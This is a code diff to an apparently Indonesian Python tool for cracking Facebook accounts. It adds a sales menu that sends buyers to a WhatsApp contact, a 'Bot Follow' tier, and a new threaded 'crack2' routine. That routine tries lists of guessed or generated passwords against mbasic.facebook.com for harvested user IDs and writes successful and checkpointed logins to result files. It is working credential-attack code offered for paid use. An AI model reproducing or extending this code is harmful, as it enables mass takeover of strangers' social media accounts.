@@ -843,6 +843,7 @@ def menu():
     print((k+"["+p+"09"+k+"]"+teszz+" Login User Administrasi"))
     print((k+"["+p+"10"+k+"]"+p+" Vvip Menu "+K+"("+I+"Pay And Free"+K+")"))
     print((k+"["+p+"11"+k+"]"+p+" Donasi "+k+"("+i+"Please bro"+k+")"))
+    print((k+"["+p+"12"+k+"]"+p+" Upgrade User Trial "+k+"("+i+"Trial To Premium"+k+")"))
     print((k+"["+p+"00"+k+"]"+p+" Logout "+k+"("+m+"REMOVE TOKEN"+k+")"))
     choose_menu()
 #+k+"[ "+m+"Not yet updated "+k+"]"))
@@ -890,6 +891,8 @@ def choose_menu():
 		os.system("xdg-open https://github.com/Dumai-991/Dumai-991/blob/main/README.md")
 		time.sleep(1.75)
 		menu()
+	elif r=="12":
+		chatme()
 	elif r=="fake":
 		fake()
 	elif r=="key":
@@ -898,6 +901,79 @@ def choose_menu():
 	else:
 		print(war+'Please Fill Correctly !!')
 		time.sleep(0.75), menu()
+def chatme():
+	print(war+"Beforle continuing, please select the active trial period ! ")
+	print(f'''{war}Social Accounts And Whatsapp Numbers :
+
+{I}Whatsapp {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
+{U}Telegram {C}:{P} +6283143565470 {C}({K}Mr.Risky{C})
+{B}Facebook {C}:{P} m.facebook.com/llovexnxx {C}({K}Risky{C})
+
+{war}Author Uses 4 Payment Methods :
+
+{B}DANA  {C}:{P} 083143565470
+{U}OVO   {C}:{P} 083143565470
+{I}GOPAY {C}:{P} 083143565470
+{P}PULSA {C}:{P} 083143565470 {C}({K}AXIS{C})
+
+{war}Key/License Price :
+
+{K}--- {I}Key Premium
+{P}1 Minggu {K}={U} Rp10.000
+{P}1 Bulan  {K}={I} Rp25.000
+{P}2 Bulan {C}+{P} Bot Follow {K}={M} 30.000
+
+{K}--- {I}Key Admin
+{P}1 Minggu {K}={U} Rp10.000
+{P}1 Bulan  {K}={I} Rp30.000
+{P}3 Bulan {C}+{P} Bot Follow {C}+{P} Bot Like {C}+{P} Bot SharePosts in Profile {K}={M} Rp40.000{q}''')
+
+	print(k+"["+p+"01"+k+"]"+k+" Premium 1 Minggu")
+	print(k+"["+p+"02"+k+"]"+k+" Premium 1 Bulan")
+	print(k+"["+p+"03"+k+"]"+k+" Premium 2 Bulan + Bot Facebook "+k+"("+p+"follow"+k+")")
+	print(k+"["+p+"04"+k+"]"+k+" Admin 1 Minggu")
+	print(k+"["+p+"05"+k+"]"+k+" Admin 1 Bulan ")
+	print(k+"["+p+"06"+k+"]"+k+" Admin 3 Bulan + Bot Facebook "+k+"("+p+"follow,like,share post"+k+")")
+	print(k+"["+p+"07"+k+"]"+k+" Premium + Admin 2 Minggu + Bot Facebook "+k+"("+p+"follow"+k+")\n")
+	nama = input(inp+"Enter Your Name (Nickname) : "+I)
+	usera = input(inp+'Please Select User Purchase Menu : '+I)
+	if nama in [""," "]:
+		jalan(war+"Please Fill Correctly !!")
+		chatme()
+	if usera in [""," "]:
+		jalan(war+"Please Fill Correctly !!")
+		chatme()
+	elif usera in ["01","1"]:
+		userx = ('Premium+Yang+1+Minggu')
+		pass
+	elif usera in ["02","2"]:
+		userx = ('Premium+Yang+1+Bulan')
+		pass
+	elif usera in ["03","3"]:
+		userx = ('Premium+Yang+2+Bulan+±+Bot+Follow')
+		pass
+	elif usera in ["04","4"]:
+		userx = ('Admin+Yang+1+Minggu')
+		pass
+	elif usera in ["05","5"]:
+		userx = ('Admin+Yang+1+Bulan')
+		pass
+	elif usera in ["6","06"]:
+		userx = ('Admin+Yang+3+Bulan+±+Bot+Follow,Like,Share')
+		pass
+	elif usera in ["7","07"]:
+		userx = ('Admin+±+Premium+2+Minggu')
+		pass
+	else:
+		jalan(war+"Please Fill Correctly !!")
+		chatme()
+	jalan(war+" You Will Be Redirected To WhatsApp Author !!")
+	print(war+"Link Whatsapp : "+I+"https://wa.me/+6283143565470?text=Hallo+Kak...+Nama+Saya+*"+nama+"*%0A%0ASaya+Mau+Beli+User+*"+userx+"*+Harap+DiProses+Iya+Kak+")
+	os.system("xdg-open https://wa.me/+6283143565470?text=Hallo+Kak...+Nama+Saya+*"+nama+"*%0A%0ASaya+Mau+Beli+User+*"+userx+"*+Harap+DiProses+Iya+Kak+")
+	time.sleep(4)
+	menu()
+
+
 def buatkey():
 	import random,string
 	expi = input(inp+"Enter Expiry Date : "+I)
@@ -1067,6 +1143,7 @@ def public():
 	id = []
 	try: 
 		print ("\n"+war+"Fill In 'me' If You Want From Your Own Publics")
+		print (war+"Press Enter To Skip..")
 		idt = input(bulat+"ID Public : "+I)
 		if idt in [""," "]:
 			print(war+"Don't Empty!!")
@@ -1286,6 +1363,7 @@ def follow():
 	id = []
 	try: 
 		print ("\n"+war+"Fill In 'me' If You Want From Your Own Followers")
+		print (war+"Press Enter To Skip..")
 		idt = input(bulat+"ID Follow 01 : "+I)
 		if idt in [""," "]:
 			print(war+"Don't Empty!!")
@@ -1801,8 +1879,9 @@ def pilihcrack(file):
   print((k+"\n["+p+"1"+k+"]"+p+" Api "+k+"("+i+" SPAM CRACK 57% "+k+")"))
   print((k+"["+p+"2"+k+"]"+p+" Api + Ttl "+k+"("+i+" SPAM CRACK 76% "+k+")"))
   print((k+"["+p+"3"+k+"]"+p+" Mbasic + Opsi Sensi"+k+"("+i+" SPAM CRACK 25% "+k+")"))
-  print((k+"["+p+"4"+k+"]"+p+" Free Facebook "+k+"("+i+" SPAM CRACK 0%"+k+")"))
-  print((k+"["+p+"5"+k+"]"+p+" Graph Facebook "+k+"("+i+" SPAM CRACK 0%"+k+")"))
+  print((k+"["+p+"4"+k+"]"+p+" Mbasic + 3 User Agent Tap Yes"+k+"("+i+" SPAM CRACK 25% "+k+")"))
+  print((k+"["+p+"5"+k+"]"+p+" Free Facebook "+k+"("+i+" SPAM CRACK 0%"+k+")"))
+  print((k+"["+p+"6"+k+"]"+p+" Graph Facebook "+k+"("+i+" SPAM CRACK 0%"+k+")"))
   krah=input(k+"\n["+p+"•"+k+"]"+p+" Choose : ")
   if krah in[""]:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
@@ -1814,8 +1893,10 @@ def pilihcrack(file):
   elif krah in["3","03"]:
     crack(file)
   elif krah in["4","04"]:
-    crackffb(file)
+    crack2(file)
   elif krah in["5","05"]:
+    crackffb(file)
+  elif krah in["6","06"]:
     grap(file)
   else:
     print((k+"["+p+"!"+k+"]"+p+" Fill In The Correct"))
@@ -2410,6 +2491,95 @@ class crackffb:
 					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					open("OK-"+durasi+".txt","a+").write(
+						"%s|%s\n"%(fl.get("id"),i))
+					break
+				else:continue
+					
+			self.ko+=1
+			print("\r\x1b[0;33m[\x1b[0;37mCrack\x1b[0;33m]\x1b[0;37m %s/%s \x1b[0;32m[\x1b[0;37mOK : %s\x1b[0;32m] \x1b[0;33m[\x1b[0;37mCP : %s\x1b[0;33m]\x1b[0;37m"%(self.ko,len(self.fl),len(self.ada),len(self.cp)), end=' ');sys.stdout.flush()
+		except:
+			self.main(fl)
+class crack2:
+	os.system("clear")
+	banner()
+	def __init__(self,isifile):
+		self.ada=[]
+		self.cp=[]
+		self.ko=0
+		pilih_pw()
+		print(("\n"+k+"["+p+"•"+k+"]"+p+" Do You Want To Use Manual Password?? "+k+"[ "+h+"Y/n"+k+" ]"+p))
+		while True:
+			f=input(k+"["+p+"•"+k+"]"+p+" Choose : ")
+			if f=="":continue
+			elif f=="Y" or f=="y":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0]})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+					continue
+				print((k+"["+p+"•"+k+"]"+p+" Example : sayang,bismillah,123456"))
+				self.pwlist()
+				break
+			elif f=="N" or f=="n":
+				try:
+					while True:
+						try:
+							self.apk=isifile
+							self.fs=open(self.apk).read().splitlines()
+							break
+						except Exception as e:
+							print(("   %s"%e))
+							continue
+					self.fl=[]
+					for i in self.fs:
+						try:
+							self.fl.append({"id":i.split("<=>")[0],"pw":generate(i.split("<=>")[1])})
+						except:continue
+				except Exception as e:
+					print(("   %s"%e))
+				print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
+				ThreadPool(35).map(self.main,self.fl)
+				os.remove(self.apk)
+				exit()
+				break
+	def pwlist(self):
+		self.pw=input(k+"["+p+"•"+k+"]"+p+" Password List : ").split(",")
+		if len(self.pw) ==0:
+			self.pwlist()
+		else:
+			for i in self.fl:
+				i.update({"pw":self.pw})
+			print((k+"\n["+p+"•"+k+"]"+p+" Crack Started..."+k+"\n["+p+"•"+k+"]"+p+" Account [OK] Saved to : Hasil/OK-"+durasi+".txt"+k+"\n["+p+"•"+k+"]"+p+" Account [CP] Saved to : Hasil/CP-"+durasi+".txt\n"))
+			ThreadPool(30).map(self.main,self.fl)
+			os.remove(self.apk)
+			exit()
+	def main(self,fl):
+		try:
+			for i in fl.get("pw"):
+				log=mbasic2(fl.get("id"),
+					i,"https://mbasic.facebook.com")
+				if log.get("status")=="cp":
+					print(("\r\x1b[0;33m[\x1b[0;37mCP\x1b[0;33m] %s|%s               "%(fl.get("id"),i)))
+					self.cp.append("%s|%s"%(fl.get("id"),i))
+					open("Hasil/CP-"+durasi+".txt","a+").write(
+						"%s|%s\n"%(fl.get("id"),i))
+					break
+				elif log.get("status")=="success":
+					print(("\r\x1b[0;32m[\x1b[0;37mOK\x1b[0;32m] %s|%s               "%(fl.get("id"),i)))
+					self.ada.append("%s|%s"%(fl.get("id"),i))
+					open("Hasil/OK-"+durasi+".txt.txt","a+").write(
 						"%s|%s\n"%(fl.get("id"),i))
 					break
 				else:continue
@@ -3268,10 +3438,11 @@ if __name__=="__main__":
 				time.sleep(2)
 				exit()
 			pilihcrack(dumai)
-
+		elif sys.argv[1] == 'vvip':
+			menuvvip()
 		else:
 			print(war+"How to Use Crack Not Login..")
-			exit(inp+"Type : python prem.py crack")
+			exit(inp+"Type : python prem.py crack or vvip")
 	os.system("git pull")
 	Get_Ua()
 	menu()
